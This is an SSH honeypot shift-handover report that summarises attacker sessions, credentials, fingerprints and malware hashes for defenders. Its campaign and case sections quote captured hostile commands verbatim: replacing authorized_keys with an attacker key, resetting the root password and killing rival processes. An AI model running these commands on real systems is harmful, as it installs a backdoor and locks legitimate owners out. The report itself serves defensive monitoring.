# 🛡 THIR · SOC Shift Handover Report

| Field | Value |
|---|---|
| **Report Date** | 2026-04-15 |
| **Generated At** | 2026-04-15T17:10:05Z |
| **Shift Time** | 17:10 UTC |
| **Honeypot Status** | ✅ HEALTHY |
| **Source** | Cowrie SSH Honeypot · AWS EC2 · Port 2222 |

---

## 📊 Executive Summary

| Metric | Value |
|---|---|
| Total Sessions Captured | **43** |
| Confirmed Threats | **41** |
| False Positives Filtered | **2** (4.7%) |
| Unique Attacker IPs | **10** |
| Countries of Origin | **5** |
| High Severity Cases | **8** |
| Medium Severity Cases | **0** |
| Low Severity Cases | **35** |
| Malware Samples Analyzed | **0** HIGH · **16** MED · 2 empty upload attempt(s) |

---

## 🔑 Credential Intelligence

| Metric | Value |
|---|---|
| Total Auth Attempts | **18** |
| Unique Credential Pairs | **15** |
| Unique Usernames | **9** |
| Unique Passwords | **15** |
| Successful Auth Pairs | **8** |

**Top Usernames:**

| Username | Attempts |
|---|---|
| `root` | 8 |
| `345gs5662d34` | 2 |
| `steam` | 2 |
| `ubuntu` | 1 |
| `vpn` | 1 |

**Top Passwords:**

| Password | Attempts |
|---|---|
| `3245gs5662d34` | 3 |
| `345gs5662d34` | 2 |
| `Dh123456` | 1 |
| `qqDD112233` | 1 |
| `ABC` | 1 |

**Top Credential Pairs:**

| Username | Password | Attempts |
|---|---|---|
| `root` | `3245gs5662d34` | 3 |
| `345gs5662d34` | `345gs5662d34` | 2 |
| `root` | `Dh123456` | 1 |
| `root` | `qqDD112233` | 1 |
| `ubuntu` | `ABC` | 1 |

**⚠️ Successful Auth Pairs (Priority — cross-reference with IR cases):**

| Username | Password | Source IP | Timestamp |
|---|---|---|---|
| `root` | `Dh123456` | `210.149.87.82` | 2026-04-15T15:41:05 |
| `root` | `3245gs5662d34` | `210.149.87.82` | 2026-04-15T15:41:09 |
| `root` | `qqDD112233` | `36.26.74.162` | 2026-04-15T15:43:21 |
| `root` | `qazwsx2019!@` | `85.173.245.55` | 2026-04-15T15:59:27 |
| `root` | `3245gs5662d34` | `85.173.245.55` | 2026-04-15T15:59:32 |
| `root` | `12qwaszx!@QWASZX` | `180.76.176.249` | 2026-04-15T16:12:10 |
| `root` | `3245gs5662d34` | `180.76.176.249` | 2026-04-15T16:12:20 |
| `root` | `@` | `171.243.149.201` | 2026-04-15T16:54:42 |

---

## 🖥 SSH Fingerprint Intelligence

| Metric | Value |
|---|---|
| Total Sessions Parsed | **43** |
| Sessions with Fingerprint | **4** |
| Unique HASSH Fingerprints | **4** |

**Client Family Distribution:**

| Client Family | Sessions |
|---|---|
| libssh | 36 |
| AsyncSSH (Python) | 4 |
| Go SSH scanner | 1 |

**⚠️ Botnet/Scanner KEX Signatures Detected:**

| HASSH | Signature | Sessions | IPs |
|---|---|---|---|
| `03a80b21afa8...` | Modern SSH client | 31 | 6 |
| `fda360b1b4f4...` | Mirai/variant | 4 | 1 |
| `084386fa7ae5...` | Mirai/variant | 1 | 1 |

**Top Fingerprints:**

| HASSH | Client | Sessions | IPs | Botnet Sig |
|---|---|---|---|---|
| `03a80b21afa8...` | libssh | 31 | 6 | Modern SSH client |
| `95420f9d932d...` | libssh | 5 | 2 | — |
| `fda360b1b4f4...` | AsyncSSH (Python) | 4 | 1 | Mirai/variant |
| `084386fa7ae5...` | Go SSH scanner | 1 | 1 | Mirai/variant |

---

## ⚔️ Attack Campaign Intelligence

| Metric | Value |
|---|---|
| Total Command Clusters | **2** |
| Campaign Clusters | **2** |
| Highest Severity | **HIGH** |

**Active Campaigns:**

| Campaign | Severity | Sessions | IPs | TTPs |
|---|---|---|---|---|
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 1 | 1 | `T1021.004, T1078, T1083, T1082` |
| **mdrfckr SSH Key Injection** | 🔴 HIGH | 3 | 3 | `T1021.004, T1078, T1070, T1140` |

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
```
cat /proc/cpuinfo | grep name | wc -l
```
```
echo "root:UVI92gVdHNwb"|chpasswd|bash
```
```
rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;
```
Source IPs: `36.26.74.162`

**🔴 HIGH · mdrfckr SSH Key Injection**

> Backdoor SSH key injection campaign. Wipes existing authorized_keys and injects attacker public key.

Representative commands:
```
cd ~; chattr -ia .ssh; lockr -ia .ssh
```
```
cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~
```
Source IPs: `85.173.245.55`, `210.149.87.82`, `180.76.176.249`

---

## 🌐 ASN Cluster Intelligence

| Metric | Value |
|---|---|
| Total IPs Analysed | **10** |
| Unique ASNs | **9** |
| High-Risk ASNs | **8** |
| Anon Infrastructure ASNs | **0** |

**Top Attack ASNs:**

| ASN | Provider | IPs | Risk |
|---|---|---|---|
| `AS8075` | Microsoft Corporation | 2 | HIGH |
| `AS7552` | Viettel Group | 1 | HIGH |
| `AS42362` | PJSC Rostelecom | 1 | HIGH |
| `AS4134` | CHINANET-BACKBONE | 1 | HIGH |
| `AS58461` | CT-HangZhou-IDC | 1 | HIGH |
| `AS17638` | ASN for TIANJIN Provincial Net of CT | 1 | HIGH |
| `AS137718` | Beijing Volcano Engine Technology Co., Ltd. | 1 | HIGH |
| `AS2497` | Internet Initiative Japan Inc. | 1 | MEDIUM |

---

---

## 🚨 Priority Cases — Immediate Attention (8)

> Cases with auth success, command execution, or file downloads.
> Each requires individual review. Never grouped.

### 🔴 HIGH · IR-294693ebc828

| Field | Detail |
|---|---|
| **Source IP** | `210.149.87[.]82` |
| **First Seen** | 2026-04-15 15:41 |
| **Last Seen** | 2026-04-15 15:41 |
| **Session Duration** | 5s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 15:41:04` | `cowrie.session.connect` |
| `2026-04-15 15:41:04` | `cowrie.client.version` |
| `2026-04-15 15:41:04` | `cowrie.client.kex` |
| `2026-04-15 15:41:05` | `cowrie.login.success` |
| `2026-04-15 15:41:05` | `cowrie.session.params` |
| `2026-04-15 15:41:05` | `cowrie.command.input` |
| `2026-04-15 15:41:05` | `cowrie.command.failed` |
| `2026-04-15 15:41:05` | `cowrie.log.closed` |
| `2026-04-15 15:41:06` | `cowrie.session.params` |
| `2026-04-15 15:41:06` | `cowrie.command.input` |
| `2026-04-15 15:41:06` | `cowrie.session.file_download` |
| `2026-04-15 15:41:06` | `cowrie.log.closed` |
| `2026-04-15 15:41:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.149.87[.]82` to AbuseIPDB if not already reported
- [ ] Block `210.149.87[.]82` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-29ffde02415a

| Field | Detail |
|---|---|
| **Source IP** | `210.149.87[.]82` |
| **First Seen** | 2026-04-15 15:41 |
| **Last Seen** | 2026-04-15 15:41 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 15:41:08` | `cowrie.session.connect` |
| `2026-04-15 15:41:08` | `cowrie.client.version` |
| `2026-04-15 15:41:08` | `cowrie.client.kex` |
| `2026-04-15 15:41:09` | `cowrie.login.success` |
| `2026-04-15 15:41:09` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `210.149.87[.]82` to AbuseIPDB if not already reported
- [ ] Block `210.149.87[.]82` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cd33275b1be8

| Field | Detail |
|---|---|
| **Source IP** | `36.26.74[.]162` |
| **First Seen** | 2026-04-15 15:43 |
| **Last Seen** | 2026-04-15 15:43 |
| **Session Duration** | 25s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~, cat /proc/cpuinfo | grep name | wc -l, echo "root:UVI92gVdHNwb"|chpasswd|bash, rm -rf /tmp/secure.sh; rm -rf /tmp/auth.sh; pkill -9 secure.sh; pkill -9 auth.sh; echo > /etc/hosts.deny; pkill -9 sleep;` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2, 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW), 01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1053.003 · T1057 · T1059.004 · T1078 · T1083 · T1105 · T1489 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 15:43:20` | `cowrie.session.connect` |
| `2026-04-15 15:43:20` | `cowrie.client.version` |
| `2026-04-15 15:43:20` | `cowrie.client.kex` |
| `2026-04-15 15:43:21` | `cowrie.login.success` |
| `2026-04-15 15:43:21` | `cowrie.session.params` |
| `2026-04-15 15:43:21` | `cowrie.command.input` |
| `2026-04-15 15:43:21` | `cowrie.command.failed` |
| `2026-04-15 15:43:22` | `cowrie.log.closed` |
| `2026-04-15 15:43:22` | `cowrie.session.params` |
| `2026-04-15 15:43:22` | `cowrie.command.input` |
| `2026-04-15 15:43:22` | `cowrie.session.file_download` |
| `2026-04-15 15:43:22` | `cowrie.log.closed` |
| `2026-04-15 15:43:38` | `cowrie.session.params` |
| `2026-04-15 15:43:38` | `cowrie.command.input` |
| `2026-04-15 15:43:38` | `cowrie.log.closed` |
| `2026-04-15 15:43:39` | `cowrie.session.params` |
| `2026-04-15 15:43:39` | `cowrie.command.input` |
| `2026-04-15 15:43:39` | `cowrie.log.closed` |
| `2026-04-15 15:43:39` | `cowrie.session.params` |
| `2026-04-15 15:43:39` | `cowrie.command.input` |
| `2026-04-15 15:43:39` | `cowrie.session.file_download` |
| `2026-04-15 15:43:39` | `cowrie.log.closed` |
| `2026-04-15 15:43:40` | `cowrie.session.params` |
| `2026-04-15 15:43:40` | `cowrie.command.input` |
| `2026-04-15 15:43:40` | `cowrie.log.closed` |
| `2026-04-15 15:43:40` | `cowrie.session.params` |
| `2026-04-15 15:43:40` | `cowrie.command.input` |
| `2026-04-15 15:43:40` | `cowrie.log.closed` |
| `2026-04-15 15:43:41` | `cowrie.session.params` |
| `2026-04-15 15:43:41` | `cowrie.command.input` |
| `2026-04-15 15:43:41` | `cowrie.command.input` |
| `2026-04-15 15:43:41` | `cowrie.log.closed` |
| `2026-04-15 15:43:41` | `cowrie.session.params` |
| `2026-04-15 15:43:41` | `cowrie.command.input` |
| `2026-04-15 15:43:41` | `cowrie.log.closed` |
| `2026-04-15 15:43:42` | `cowrie.session.params` |
| `2026-04-15 15:43:42` | `cowrie.command.input` |
| `2026-04-15 15:43:42` | `cowrie.log.closed` |
| `2026-04-15 15:43:42` | `cowrie.session.params` |
| `2026-04-15 15:43:42` | `cowrie.command.input` |
| `2026-04-15 15:43:42` | `cowrie.log.closed` |
| `2026-04-15 15:43:43` | `cowrie.session.params` |
| `2026-04-15 15:43:43` | `cowrie.command.input` |
| `2026-04-15 15:43:43` | `cowrie.log.closed` |
| `2026-04-15 15:43:43` | `cowrie.session.params` |
| `2026-04-15 15:43:43` | `cowrie.command.input` |
| `2026-04-15 15:43:43` | `cowrie.log.closed` |
| `2026-04-15 15:43:44` | `cowrie.session.params` |
| `2026-04-15 15:43:44` | `cowrie.command.input` |
| `2026-04-15 15:43:44` | `cowrie.log.closed` |
| `2026-04-15 15:43:44` | `cowrie.session.params` |
| `2026-04-15 15:43:44` | `cowrie.command.input` |
| `2026-04-15 15:43:44` | `cowrie.log.closed` |
| `2026-04-15 15:43:45` | `cowrie.session.params` |
| `2026-04-15 15:43:45` | `cowrie.command.input` |
| `2026-04-15 15:43:45` | `cowrie.log.closed` |
| `2026-04-15 15:43:45` | `cowrie.session.params` |
| `2026-04-15 15:43:45` | `cowrie.command.input` |
| `2026-04-15 15:43:45` | `cowrie.log.closed` |
| `2026-04-15 15:43:46` | `cowrie.session.params` |
| `2026-04-15 15:43:46` | `cowrie.command.input` |
| `2026-04-15 15:43:46` | `cowrie.log.closed` |
| `2026-04-15 15:43:46` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `36.26.74[.]162` to AbuseIPDB if not already reported
- [ ] Block `36.26.74[.]162` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d0e11acf9df2

| Field | Detail |
|---|---|
| **Source IP** | `85.173.245[.]55` |
| **First Seen** | 2026-04-15 15:59 |
| **Last Seen** | 2026-04-15 15:59 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 15:59:26` | `cowrie.session.connect` |
| `2026-04-15 15:59:26` | `cowrie.client.version` |
| `2026-04-15 15:59:26` | `cowrie.client.kex` |
| `2026-04-15 15:59:27` | `cowrie.login.success` |
| `2026-04-15 15:59:27` | `cowrie.session.params` |
| `2026-04-15 15:59:27` | `cowrie.command.input` |
| `2026-04-15 15:59:27` | `cowrie.command.failed` |
| `2026-04-15 15:59:28` | `cowrie.log.closed` |
| `2026-04-15 15:59:28` | `cowrie.session.params` |
| `2026-04-15 15:59:28` | `cowrie.command.input` |
| `2026-04-15 15:59:28` | `cowrie.session.file_download` |
| `2026-04-15 15:59:28` | `cowrie.log.closed` |
| `2026-04-15 15:59:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.173.245[.]55` to AbuseIPDB if not already reported
- [ ] Block `85.173.245[.]55` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-bb583ef12d00

| Field | Detail |
|---|---|
| **Source IP** | `85.173.245[.]55` |
| **First Seen** | 2026-04-15 15:59 |
| **Last Seen** | 2026-04-15 15:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 15:59:31` | `cowrie.session.connect` |
| `2026-04-15 15:59:31` | `cowrie.client.version` |
| `2026-04-15 15:59:31` | `cowrie.client.kex` |
| `2026-04-15 15:59:32` | `cowrie.login.success` |
| `2026-04-15 15:59:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `85.173.245[.]55` to AbuseIPDB if not already reported
- [ ] Block `85.173.245[.]55` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d8262e4ac211

| Field | Detail |
|---|---|
| **Source IP** | `180.76.176[.]249` |
| **First Seen** | 2026-04-15 16:12 |
| **Last Seen** | 2026-04-15 16:12 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 16:12:09` | `cowrie.session.connect` |
| `2026-04-15 16:12:09` | `cowrie.client.version` |
| `2026-04-15 16:12:09` | `cowrie.client.kex` |
| `2026-04-15 16:12:10` | `cowrie.login.success` |
| `2026-04-15 16:12:12` | `cowrie.session.params` |
| `2026-04-15 16:12:12` | `cowrie.command.input` |
| `2026-04-15 16:12:12` | `cowrie.command.failed` |
| `2026-04-15 16:12:12` | `cowrie.log.closed` |
| `2026-04-15 16:12:12` | `cowrie.session.params` |
| `2026-04-15 16:12:12` | `cowrie.command.input` |
| `2026-04-15 16:12:13` | `cowrie.session.file_download` |
| `2026-04-15 16:12:13` | `cowrie.log.closed` |
| `2026-04-15 16:12:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.176[.]249` to AbuseIPDB if not already reported
- [ ] Block `180.76.176[.]249` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87e76dd6fc33

| Field | Detail |
|---|---|
| **Source IP** | `180.76.176[.]249` |
| **First Seen** | 2026-04-15 16:12 |
| **Last Seen** | 2026-04-15 16:12 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 16:12:19` | `cowrie.session.connect` |
| `2026-04-15 16:12:19` | `cowrie.client.version` |
| `2026-04-15 16:12:19` | `cowrie.client.kex` |
| `2026-04-15 16:12:20` | `cowrie.login.success` |
| `2026-04-15 16:12:21` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `180.76.176[.]249` to AbuseIPDB if not already reported
- [ ] Block `180.76.176[.]249` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-add66f2466e1

| Field | Detail |
|---|---|
| **Source IP** | `171.243.149[.]201` |
| **First Seen** | 2026-04-15 16:54 |
| **Last Seen** | 2026-04-15 16:54 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-04-15 16:54:40` | `cowrie.session.connect` |
| `2026-04-15 16:54:40` | `cowrie.client.version` |
| `2026-04-15 16:54:41` | `cowrie.client.kex` |
| `2026-04-15 16:54:42` | `cowrie.login.success` |
| `2026-04-15 16:54:42` | `cowrie.direct-tcpip.request` |
| `2026-04-15 16:54:42` | `cowrie.direct-tcpip.ja4h` |
| `2026-04-15 16:54:42` | `cowrie.direct-tcpip.data` |
| `2026-04-15 16:54:42` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `171.243.149[.]201` to AbuseIPDB if not already reported
- [ ] Block `171.243.149[.]201` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

---

## 📡 Reconnaissance Activity — Grouped by Source IP

> Repeated connect/close sessions with no auth success, commands, or downloads.
> Grouped within a 120-minute window per IP to reduce noise.

| IP | Sessions | First Seen | Last Seen | Duration | Login Attempts | TTPs | Severity |
|---|---|---|---|---|---|---|---|
| `180.76.176[.]249` | **22** | 2026-04-15 15:59 | 2026-04-15 16:19 | 30m | 5 | `T1110.001 · T1592` | 🟠 MEDIUM |
| `171.243.149[.]201` | **3** | 2026-04-15 16:51 | 2026-04-15 16:54 | 0m | 3 | `T1110.001 · T1592` | 🟢 LOW |
| `135.237.127[.]71` | **2** | 2026-04-15 16:17 | 2026-04-15 16:17 | 0m | 0 | `T1592` | 🟢 LOW |
| `36.26.74[.]162` | **2** | 2026-04-15 15:43 | 2026-04-15 15:45 | 4m | 0 | `T1592` | 🟢 LOW |
| `115.191.15[.]152` | 1 | 2026-04-15 16:01 | 2026-04-15 16:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `180.213.44[.]242` | 1 | 2026-04-15 16:01 | 2026-04-15 16:03 | 120s | 0 | `T1592` | 🟢 LOW |
| `49.88.156[.]34` | 1 | 2026-04-15 16:31 | 2026-04-15 16:33 | 120s | 0 | `T1592` | 🟢 LOW |
| `85.173.245[.]55` | 1 | 2026-04-15 15:59 | 2026-04-15 15:59 | 2s | 1 | `T1110.001 · T1592` | 🟢 LOW |

---

## 🦠 Malware Analysis Results (22 sample(s))

| File | Type | SHA-256 (short) | Threat Score | Severity | VT Detections |
|---|---|---|---|---|---|
| `01ba4719c80b6fe911b091a7c05124b64eeece964e09c058ef8f9805daca546b` | Unknown binary | `01ba4719c80b6fe9...` | 0/100 | 🟢 LOW | 0/76 ✅ |
| `12de77bef9500e41c76a2200bc6fa712e7e3fc188dfdd92a764a22c3421b7208` | ELF Binary (Linux executable) (x86-64 64-bit) | `12de77bef9500e41...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `17b7944a9b8a4e3edb1b1f2e743ae5d06dae0a8c3a9531e94970aa3261c2cab5` | ELF Binary (Linux executable) (x86-64 64-bit) | `17b7944a9b8a4e3e...` | 45/100 | 🟡 MEDIUM | **38/76** 🔴 |
| `38ef0580d99fb1524c13f8dc4981fe2757deb290b29f947ebc24b4b359756f63` | ELF Binary (Linux executable) (x86-64 64-bit) | `38ef0580d99fb152...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 43/100 | 🟡 MEDIUM | **35/76** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 41/100 | 🟡 MEDIUM | **29/76** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 44/100 | 🟡 MEDIUM | **36/76** 🔴 |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 48/100 | 🟡 MEDIUM | **48/76** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **33/76** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 11/100 | 🟢 LOW | **30/76** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **34/76** 🔴 |
